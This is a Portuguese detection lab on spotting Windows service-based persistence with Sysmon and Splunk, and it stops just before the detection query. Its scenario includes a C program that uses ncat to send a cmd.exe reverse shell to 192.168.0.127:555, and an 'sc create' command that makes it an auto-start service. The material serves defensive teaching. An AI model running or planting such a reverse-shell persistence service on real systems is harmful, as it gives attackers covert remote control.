# Lab 04 - Persistência via Serviços
## Objetivo
Detectar uma tentativa de persistência que utilize serviços em ambiente Windows, utilizando Sysmon como gerador de eventos e Splunk como SIEM.

## Cenário Geral
Um atacante obteve acesso inicial ao host e executa tentativas de estabelecer persistência. Para isto, ele faz upload do *ncat.exe* em *C:\Users\vboxusers\Downloads* e cria um executável de persistência no sistema para iniciar o *ncat.exe* conectando o prompt de comando do sistema ao atacante remoto a cada login do usuário **VboxUser**. 
<br>
Após acesso inicial, o atacante fez upload do seguinte executável escrito em C :
```C
#include <stdlib.h>

int main(){
        system("C:\\Users\\vboxuser\\Downloads\\ncat.exe 192.168.0.127 555 -e C:\\Windows\\System32\\cmd.exe");
        return 0;
}
```
e o salva como "*C:\Users\vboxuser\Downloads\persistence.exe*". Logo após, executou o seguinte comando no Prompt de Comandos:
```bash
sc create Persistence binpath= C:\Users\vboxuser\Downloads\persistence.exe start= auto
```
criando um serviço chamado "*Persistence*".
## Telemetria Gerada
### Primeiro Método de Detecção: Sysmon Event ID 1
Executar o comando citado anteriormente para criar o serviço dispara o evento "Process Creation" de ID 1 do Sysmon. Para detectar esta execução suspeita, basta procurar por eventos de criação de processo relacionados ao utilitário "*sc*":
